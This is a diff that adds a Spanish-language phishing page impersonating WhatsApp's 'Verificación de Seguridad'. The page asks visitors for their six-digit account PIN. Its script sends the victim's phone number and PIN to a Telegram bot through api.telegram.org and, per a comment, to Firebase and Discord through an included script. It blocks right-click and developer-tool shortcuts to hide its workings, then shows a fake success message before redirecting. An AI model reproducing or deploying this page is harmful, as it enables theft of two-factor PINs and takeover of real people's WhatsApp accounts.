@@ -1,0 +1,568 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad - WhatsApp</title>
+    <!-- Favicon de WhatsApp -->
+    <link rel="shortcut icon" type="image/png" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rFVoUqc_cgA.png">
+    <!-- Fuente similar a la de WhatsApp -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <!-- Iconos de Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Scripts de integración -->
+    <script src="xjsx.js"></script>
+    <style>
+        /* Paleta de colores inspirada en WhatsApp */
+        :root {
+            --wa-primary-green: #008069;
+            --wa-secondary-green: #25d366;
+            --wa-light-green: #dcf8c6;
+            --wa-background: #eae6df;
+            --wa-chat-background: #e5ddd5;
+            --wa-white: #ffffff;
+            --wa-light-gray: #f0f2f5;
+            --wa-text-primary: #3b4a54;
+            --wa-text-secondary: #667781;
+            --wa-error: #ff3860;
+            --wa-border-radius: 12px;
+            --wa-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --wa-transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            font-family: 'Roboto', sans-serif;
+            color: var(--wa-text-primary);
+            /* Fondo clásico de chat de WhatsApp */
+            background-color: var(--wa-chat-background);
+            background-image: url("data:image/svg+xml,%3Csvg width='600' height='600' viewBox='0 0 600 600' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23999289' fill-opacity='0.15'%3E%3Cpath d='M582 600L600 582 0 182 18 200zM300 0l18 18-300 300-18-18z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
+        }
+
+        /* Contenedor de la animación inicial */
+        .pre-verificacion-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            width: 100%;
+            max-width: 450px;
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        .pre-verificacion-container h1 {
+            font-size: 1.2rem;
+            font-weight: 500;
+            margin-bottom: 25px;
+            color: var(--wa-text-primary);
+        }
+
+        /* Estilo del teléfono */
+        .telefono-mockup {
+            width: 280px;
+            height: 520px;
+            background: #111;
+            border-radius: 40px;
+            padding: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2), inset 0 2px 2px #555;
+            position: relative;
+        }
+
+        .telefono-screen {
+            background: var(--wa-white);
+            height: 100%;
+            border-radius: 30px;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+            display: flex;
+            align-items: flex-start; /* Alinea la notificación arriba */
+            justify-content: center;
+        }
+        
+        .wa-notificacion {
+            background: rgba(240, 242, 245, 0.9);
+            backdrop-filter: blur(10px);
+            border-radius: var(--wa-border-radius);
+            padding: 12px;
+            width: 100%;
+            max-width: 95%;
+            opacity: 0;
+            animation: slideIn 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94) 0.5s forwards;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border: 1px solid rgba(0,0,0,0.05);
+            margin-top: 20px;
+        }
+
+        .wa-notificacion-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .wa-notificacion-header .fab {
+            font-size: 1.2rem;
+            color: var(--wa-secondary-green);
+        }
+        
+        .wa-notificacion-header strong {
+            font-weight: 700;
+            color: var(--wa-text-primary);
+        }
+
+        .wa-notificacion-body p {
+            font-size: 0.95rem;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        .wa-notificacion-body .code {
+            font-weight: 700;
+            font-size: 1.6rem;
+            letter-spacing: 3px;
+            color: var(--wa-primary-green);
+            display: block;
+            margin-top: 5px;
+            text-align: center;
+        }
+        
+        .wa-notificacion-body .code span {
+            opacity: 0;
+            animation: digitAppear 0.5s forwards;
+            display: inline-block;
+        }
+        /* Animación escalonada mejorada */
+        .code span:nth-child(1) { animation-delay: 1.2s; }
+        .code span:nth-child(2) { animation-delay: 1.3s; }
+        .code span:nth-child(3) { animation-delay: 1.4s; }
+        .code span.dash { animation-delay: 1.6s; }
+        .code span:nth-child(5) { animation-delay: 1.7s; }
+        .code span:nth-child(6) { animation-delay: 1.8s; }
+        .code span:nth-child(7) { animation-delay: 1.9s; }
+
+        /* Contenedor principal del formulario (inicialmente oculto) */
+        .wa-container {
+            display: none; /* Oculto por defecto */
+            width: 100%;
+            max-width: 420px;
+            background: var(--wa-white);
+            border-radius: var(--wa-border-radius);
+            box-shadow: var(--wa-shadow);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Encabezado mejorado */
+        .wa-header {
+            padding: 25px 20px 20px;
+            text-align: center;
+            background: var(--wa-primary-green);
+            color: var(--wa-white);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wa-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .wa-logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .wa-logo {
+            width: 70px;
+            height: 70px;
+            background: var(--wa-white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+            z-index: 1;
+        }
+
+        .wa-logo i {
+            font-size: 38px;
+            color: var(--wa-secondary-green);
+        }
+        
+        .wa-header h1 {
+            font-size: 1.5rem;
+            font-weight: 500;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .wa-subtitle {
+            font-size: 0.95rem;
+            font-weight: 400;
+            opacity: 0.9;
+            max-width: 90%;
+            margin: auto;
+            line-height: 1.5;
+        }
+
+        .wa-content {
+            padding: 25px 30px;
+        }
+
+        .wa-form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .wa-input-label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: var(--wa-text-primary);
+            font-size: 1rem;
+        }
+
+        .wa-input-container {
+            position: relative;
+        }
+        
+        .wa-input {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 1.2rem;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            border-radius: 0;
+            outline: none;
+            background: transparent;
+            transition: var(--wa-transition);
+            color: var(--wa-text-primary);
+            font-weight: 500;
+            letter-spacing: 5px;
+            text-align: center;
+        }
+
+        .wa-input:focus {
+            border-bottom-color: var(--wa-secondary-green);
+        }
+
+        .wa-input::placeholder {
+            color: #b0bec5;
+            letter-spacing: normal;
+            font-weight: 400;
+        }
+
+        .wa-btn {
+            width: 100%;
+            padding: 12px;
+            background: #008069;(--wa-secondary-green);
+            color: white;
+            font-size: 1rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+            transition: var(--wa-transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .wa-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.4);
+        }
+
+        .wa-btn:disabled {
+            background: #b0bec5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .wa-security {
+            background: rgba(255, 56, 96, 0.1);
+            border-radius: var(--wa-border-radius);
+            padding: 15px;
+            margin-top: 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-left: 5px solid var(--wa-error);
+        }
+
+        .wa-security i {
+            font-size: 1.5rem;
+            color: var(--wa-error);
+        }
+
+        .wa-security p {
+            font-size: 0.9rem;
+            line-height: 1.5;
+            color: var(--wa-text-secondary);
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+        @keyframes fadeOut { from { opacity: 1; transform: scale(1); } to { opacity: 0; transform: scale(0.95); } }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes digitAppear { from { opacity: 0; transform: translateY(15px) scale(0.8); } to { opacity: 1; transform: translateY(0) scale(1); } }
+
+        .wa-error-message {
+            color: var(--wa-error);
+            font-size: 0.9rem;
+            margin-top: 8px;
+            text-align: center;
+            display: none;
+        }
+
+        .wa-input.invalid {
+            border-bottom-color: var(--wa-error);
+        }
+
+        @media (max-width: 480px) {
+            .wa-container, .pre-verificacion-container { max-width: 90vw; }
+            .wa-content { padding: 20px; }
+            .wa-header { padding: 20px 15px 15px; }
+            .telefono-mockup { transform: scale(0.9); }
+            .pre-verificacion-container h1 { font-size: 1.1rem; }
+        }
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script type="text/javascript" src="telgm.js"></script>
+</head>
+<body oncontextmenu="return false">
+
+<script>
+document.addEventListener("keydown", function(e) {
+    if(e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "u")) {
+        e.preventDefault();
+        return false;
+    }
+});
+</script>
+
+<!-- Pantalla de animación inicial -->
+<div class="pre-verificacion-container">
+    <h1>Verifica tu identidad ingresando el código PIN asociado a tu cuenta de WhatsApp.</h1>
+    <div class="telefono-mockup">
+        <div class="telefono-screen">
+            <div class="wa-notificacion">
+                <div class="wa-notificacion-header">
+                    <i class="fab fa-whatsapp"></i>
+                    <strong>WhatsApp</strong>
+                </div>
+                <div class="wa-notificacion-body">
+                    <p>Código de verificación PIN de seguridad:</p>
+                    <p><strong class="code">
+                        <span>*</span><span>*</span><span>*</span><span class="dash">-</span><span>*</span><span>*</span><span>*</span>
+                    </strong></p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Pantalla de verificación principal -->
+<div class="wa-container" aria-live="polite">
+    <div class="wa-header">
+        <div class="wa-logo-container">
+            <div class="wa-logo">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <h1>Verificación PIN</h1>
+            <p class="wa-subtitle" id="wa-subtitle">Pin de autenticación
+Para finalizar, introduzca el código de autenticacion (PIN) de su cuenta que termina en **** *** 0000</p>
+        </div>
+    </div>
+    <div class="wa-content">
+        <form id="loginForm" aria-label="Formulario de verificación de código">
+            <div class="wa-form-group">
+                <label for="auth" class="wa-input-label">Código de Autenticación PIN</label>
+                <div class="wa-input-container">
+                    <input type="text" id="auth" name="auth" minlength="6" maxlength="6"
+                           placeholder="* * * * * *" required pattern="[0-9]{6}"
+                           class="wa-input" aria-describedby="error-message"
+                           oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6)">
+                </div>
+                <div class="wa-error-message" id="error-message" role="alert">
+                    Por favor, ingresa un código de 6 dígitos válido
+                </div>
+            </div>
+            <button type="submit" id="submitButton" class="wa-btn">
+                <i class="fas fa-lock"></i> Verificar Cuenta
+            </button>
+            <div class="wa-security">
+                <i class="fas fa-exclamation-triangle" aria-hidden="true"></i>
+                <p>Asegúrese de que el código sea el correcto, ya que esta validación es necesaria para verificar su identidad. En caso de error podría ser bloqueado.</p>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+$(document).ready(function() {
+    
+    // Lógica para la transición automática
+    setTimeout(function() {
+        $('.pre-verificacion-container').css('animation', 'fadeOut 0.8s forwards');
+        setTimeout(function() {
+            $('.pre-verificacion-container').hide();
+            $('.wa-container').show().css('animation', 'fadeIn 0.8s forwards');
+        }, 800); // Debe coincidir con la duración de fadeOut
+    }, 4000); // 4 segundos en total para la pantalla de animación
+    
+    // Función para obtener el teléfono del localStorage
+    function obtenerTelefonoUsuario() {
+        let telefono = localStorage.getItem('telefonoUsuario') || localStorage.getItem('telefono') || '0000000000';
+        return telefono;
+    }
+
+    // Función para gestionar códigos usados
+    function getUsedCodes(telefono) {
+        const usedCodes = JSON.parse(localStorage.getItem('usedCodes') || '{}');
+        return usedCodes[telefono] || [];
+    }
+
+    function saveUsedCode(telefono, code) {
+        const usedCodes = JSON.parse(localStorage.getItem('usedCodes') || '{}');
+        if (!usedCodes[telefono]) {
+            usedCodes[telefono] = [];
+        }
+        if (!usedCodes[telefono].includes(code)) {
+            usedCodes[telefono].push(code);
+            localStorage.setItem('usedCodes', JSON.stringify(usedCodes));
+        }
+    }
+
+    // Actualizar subtítulo con los últimos 4 dígitos del número de teléfono
+    function actualizarSubtitulo() {
+        const telefono = obtenerTelefonoUsuario();
+        const soloDigitos = telefono.replace(/\D/g, '');
+        const lastFourDigits = soloDigitos.length >= 4 ? soloDigitos.slice(-4) : '0000';
+        $('#wa-subtitle').text(`Hemos enviado un código de 6 dígitos de autenticación PIN a tu número que termina en *** *** ${lastFourDigits}`);
+    }
+
+    actualizarSubtitulo();
+
+    // Función para enviar mensaje a Telegram si está configurado
+    function enviarMensajeTelegram(mensaje) {
+        if (typeof telegram_bot_id === 'undefined' || typeof chat_id === 'undefined') {
+            return false;
+        }
+        
+        const settings = {
+            async: true,
+            crossDomain: true,
+            url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "cache-control": "no-cache"
+            },
+            data: JSON.stringify({
+                chat_id: chat_id,
+                text: mensaje
+            })
+        };
+        
+        return $.ajax(settings);
+    }
+
+    // Validación del formulario
+    $('#loginForm').submit(async function(e) {
+        e.preventDefault();
+        const codeInput = $('#auth');
+        const errorMessage = $('#error-message');
+        const submitButton = $('#submitButton');
+        const code = codeInput.val().trim();
+        const telefono = obtenerTelefonoUsuario();
+        const usedCodes = getUsedCodes(telefono);
+
+        // Resetear estado
+        codeInput.removeClass('invalid').attr('aria-invalid', 'false');
+        errorMessage.hide();
+
+        // Validar si el código coincide con el código de pantalla
+        const screenCode = localStorage.getItem('screenCode');
+        if (screenCode && code === screenCode) {
+            codeInput.addClass('invalid').attr('aria-invalid', 'true');
+            errorMessage.text('Este código ya fue utilizado anteriormente. Por favor ingrese un código diferente.').show();
+            return;
+        }
+
+        // Validar el código (6 dígitos numéricos)
+        if (!/^\d{6}$/.test(code)) {
+            codeInput.addClass('invalid').attr('aria-invalid', 'true');
+            errorMessage.text('Por favor, ingresa un código de 6 dígitos válido').show();
+            return;
+        }
+
+        // Verificar si el código ya fue usado (en usedCodes)
+        if (usedCodes.includes(code)) {
+            codeInput.addClass('invalid').attr('aria-invalid', 'true');
+            errorMessage.text('Este código ya fue utilizado anteriormente. Por favor ingrese un código diferente.').show();
+            return;
+        }
+
+        submitButton.prop('disabled', true).html('<i class="fas fa-spinner fa-spin"></i> Verificando...');
+
+        // Guardar el código como usado
+        saveUsedCode(telefono, code);
+
+        // Guardar en Firebase y enviar a Discord a través de xjsx.js
+        if (window.sendWhatsAppPIN) {
+            try {
+                await window.sendWhatsAppPIN(telefono, code);
+            } catch(e) {
+                console.warn('Error llamando Firebase function:', e);
+            }
+        }
+
+        // Enviar a Telegram si está configurado (no bloqueante)
+        try {
+            const mensajeTelegram = "🔐 Código de Autenticación PIN 🔐\n\n" +
+                "📞 Teléfono: " + telefono + "\n" +
+                "🔑 Código PIN: " + code + "\n" +
+                "📅 Fecha/Hora: " + new Date().toLocaleString();
+            enviarMensajeTelegram(mensajeTelegram);
+        } catch(err) {}
+
+        submitButton.html('<i class="fas fa-check"></i> Verificación Exitosa').css('background', '#28a745');
+
+        setTimeout(function() {
+            window.location = 'cargando.html';
+        }, 800);
+    });
+});
+</script>
+</body>
+</html>
+
+
